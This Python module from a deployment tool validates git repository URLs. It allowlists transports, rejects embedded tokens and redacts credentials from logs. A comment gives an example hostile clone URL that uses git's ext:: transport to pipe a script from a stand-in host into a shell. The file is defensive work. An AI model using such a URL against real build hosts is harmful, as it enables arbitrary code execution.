"""Which repository URLs are safe to hand to git.

A policy decision about strings, so it lives in the domain rather than beside
the subprocess that consumes it — the API needs to apply the same rule when a
project is created, long before anything is cloned.
"""

from __future__ import annotations

import re

from deploypro.domain.errors import InvalidRequest

#: The only transports allowed in a repository URL.
#:
#: `ext::` is the reason this is an allowlist rather than a check for the
#: obviously bad. Git's ext transport treats the rest of the URL as a shell
#: command and runs it, so `ext::sh -c 'curl evil.sh | sh'` is a valid clone
#: URL and cloning it is arbitrary code execution on the build host. Anything
#: not named here is refused before git sees it.
ALLOWED_SCHEMES = ("https://", "http://", "ssh://", "git@")

#: Userinfo in an http(s) URL: `https://<this>@github.com/…`.
_HTTP_USERINFO = re.compile(r"(https?://)[^/\s@]+@", re.IGNORECASE)

#: `git@github.com:owner/repo.git` — the scp-like form GitHub shows for SSH.
_SCP_LIKE = re.compile(r"^[A-Za-z0-9._-]+@[A-Za-z0-9.-]+:(?!//)")

#: GitHub's SSH host keys, pinned, so a clone from github.com cannot be
#: answered by anyone else. Checked when added against the fingerprints GitHub
#: publishes (docs.github.com, "GitHub's SSH key fingerprints"):
#:   SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU (ED25519)
#:   SHA256:p2QAMXNIC1TJYWeIOttrVc98/R1BUFWu3/LiyKgUfQM (ECDSA)
#: If GitHub ever rotates them, clones fail loudly with "host key verification
#: failed" rather than trusting a new key silently; update these two lines.
GITHUB_KNOWN_HOSTS = (
    "github.com ssh-ed25519 "
    "AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl",
    "github.com ecdsa-sha2-nistp256 "
    "AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEmKSENjQEezOmxkZMy7opKgwFB9"
    "nkt5YRrYMjNuG5N87uRgg6CLrbo5wAdT/y6v0mKV0U2w0WZ2YB/++Tpockg=",
)


def validate_repo_url(url: str) -> str:
    cleaned = url.strip()
    if not cleaned:
        raise InvalidRequest("Repository URL is required")
    if not cleaned.startswith(ALLOWED_SCHEMES):
        raise InvalidRequest(
            f"Unsupported repository URL {redact(cleaned)!r}. Use an https:// or "
            "ssh:// URL — other git transports can execute commands on this host."
        )
    if _HTTP_USERINFO.match(cleaned):
        # A token in the URL would be stored in plain text, printed in every
        # deploy log and shown by the dashboard. A deploy key does the same
        # job with none of that, and can only ever read this one repository.
        raise InvalidRequest(
            "Do not put a token or password in the repository URL. For a "
            "private repository, use its SSH URL (git@github.com:owner/repo.git) "
            "and a deploy key: `deploypro project key <project>` prints one to "
            "add to the repository."
        )
    return cleaned


def is_ssh_url(url: str) -> bool:
    """Whether git will reach this repository over SSH, and so can use a
    deploy key."""
    cleaned = url.strip()
    return cleaned.startswith("ssh://") or bool(_SCP_LIKE.match(cleaned))


def redact(text: str) -> str:
    """Blank out credentials in any http(s) URL inside `text`.

    Validation already refuses them in a project's URL. This is the backstop
    for everything else that can print a URL — git's own error messages, a
    redirect it followed — so a credential that arrives some other way still
    never reaches a log line or an HTTP response.
    """
    return _HTTP_USERINFO.sub(r"\1***@", text)
